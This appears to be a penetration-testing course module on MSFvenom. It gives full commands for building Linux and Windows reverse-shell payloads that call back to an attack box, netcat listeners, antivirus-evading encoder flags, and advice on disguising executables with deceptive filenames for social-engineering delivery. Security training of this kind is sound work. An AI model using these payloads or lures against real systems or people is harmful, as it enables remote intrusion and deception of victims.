# 08 — Crafting Payloads with MSFvenom

## Overview

MSFvenom is a **standalone payload generator** — separate from the Metasploit console. Use it when you can't directly exploit a target over the network and need to **create a file** that you deliver via email, USB, download link, or social engineering.

> Metasploit modules deliver payloads automatically over the network. MSFvenom **creates payload files** you deliver manually.

---

## Staged vs Stageless Payloads

This is a critical concept that determines how your payload is delivered and executed.

### Staged (two-step delivery)

```
Stage 1: Small stub sent to target → calls back to attacker
Stage 2: Attacker sends the full payload over the network
```

- **Name format:** `linux/x86/shell/reverse_tcp` (slashes separate the stages)
- **Pro:** Smaller initial payload
- **Con:** Requires stable network connection for stage 2; more traffic = more detection risk

### Stageless (all-in-one delivery)

```
Entire payload sent at once → executes immediately
```

- **Name format:** `linux/x86/shell_reverse_tcp` (underscore, no separation)
- **Pro:** No call-back needed for additional stages; works on unstable connections; less network traffic
- **Con:** Larger initial payload

### How to Tell Them Apart (Naming Convention)

| Payload Name | Type | How to Tell |
|-------------|------|-------------|
| `windows/meterpreter/reverse_tcp` | **Staged** | `/meterpreter/` and `/reverse_tcp` are separate stages |
| `windows/meterpreter_reverse_tcp` | **Stageless** | `meterpreter_reverse_tcp` is all one chunk |
| `linux/x86/shell/reverse_tcp` | **Staged** | `/shell/` and `/reverse_tcp` are separated |
| `linux/x64/shell_reverse_tcp` | **Stageless** | `shell_reverse_tcp` is combined |

> **Quick rule:** Slashes between shell and connection type = **staged**. Underscore = **stageless**.

---

## Building Payloads with MSFvenom

### List All Available Payloads

```bash
msfvenom -l payloads
```

> 590+ payloads. Filter with `grep`: `msfvenom -l payloads | grep linux/x64`

---

### Linux Stageless Reverse Shell

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

| Flag | Meaning |
|------|---------|
| `-p linux/x64/shell_reverse_tcp` | Payload: Linux 64-bit, stageless, TCP reverse shell |
| `LHOST=10.10.14.113` | Your attack box IP (where the shell calls back) |
| `LPORT=443` | Your listening port |
| `-f elf` | Output format: ELF binary (Linux executable) |
| `> createbackup.elf` | Output filename (name it something inconspicuous) |

**Catch the shell:**

```bash
sudo nc -lvnp 443
```

---

### Windows Stageless Reverse Shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

| Flag | Meaning |
|------|---------|
| `-p windows/shell_reverse_tcp` | Payload: Windows x86, stageless, TCP reverse shell |
| `-f exe` | Output format: Windows executable |
| `> BonusCompensationPlanpdf.exe` | Filename designed to trick the user |

**Catch the shell:**

```bash
sudo nc -lvnp 443
```

---

## Common MSFvenom Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `-p` | Select payload | `-p windows/shell_reverse_tcp` |
| `-f` | Output format | `-f exe`, `-f elf`, `-f raw`, `-f python` |
| `-o` | Output file (alternative to `>`) | `-o payload.exe` |
| `-e` | Encoder (AV evasion) | `-e x86/shikata_ga_nai` |
| `-i` | Encoder iterations | `-i 10` |
| `-l` | List (payloads, encoders, formats) | `-l payloads`, `-l encoders` |
| `LHOST` | Attacker IP | `LHOST=10.10.14.113` |
| `LPORT` | Attacker port | `LPORT=443` |

---

## Common Output Formats

| Format | Flag | Platform |
|--------|------|----------|
| ELF | `-f elf` | Linux |
| EXE | `-f exe` | Windows |
| DLL | `-f dll` | Windows |
| MSI | `-f msi` | Windows |
| Raw | `-f raw` | Any |
| Python | `-f python` | Script output |
| PowerShell | `-f psh` | Windows |
| WAR | `-f war` | Java web apps |
| ASP | `-f asp` | IIS web apps |

---

## Delivery Methods

Once the payload file is created, you need to get it onto the target:

| Method | Scenario |
|--------|----------|
| **Email attachment** | Social engineering — disguise filename |
| **Download link** | Host on your web server, send link to target |
| **Metasploit module** | Combine with an exploit (requires network access) |
| **USB drive** | Physical/onsite pentest |
| **File upload vulnerability** | Upload through a web app |
| **File transfer methods** | Use techniques from the File Transfers module |

---

## AV Considerations

| Reality | Detail |
|---------|--------|
| **Unencoded payloads get caught** | Windows Defender will block raw MSFvenom output |
| **Encoding helps but isn't foolproof** | `-e x86/shikata_ga_nai -i 10` adds obfuscation |
| **Filename matters** | `BonusCompensationPlan.pdf.exe` is social engineering |
| **Stageless can be stealthier** | Less network traffic = less IDS detection |
| **AV disabled in labs** | Lab exercises may require disabling Defender to practice |

---

## Key Takeaways

| Point | Detail |
|-------|--------|
| **MSFvenom ≠ Metasploit console** | MSFvenom creates files; `msfconsole` exploits live |
| **Staged = two-step** | Small loader calls back for full payload (slashes in name) |
| **Stageless = all-in-one** | Full payload in one file (underscores in name) |
| **Always match OS + arch** | Linux → ELF, Windows → EXE, correct architecture (x86/x64) |
| **Port 443** | Use common ports for the callback to avoid firewall blocks |
| **Name it convincingly** | Social engineering starts with the filename |
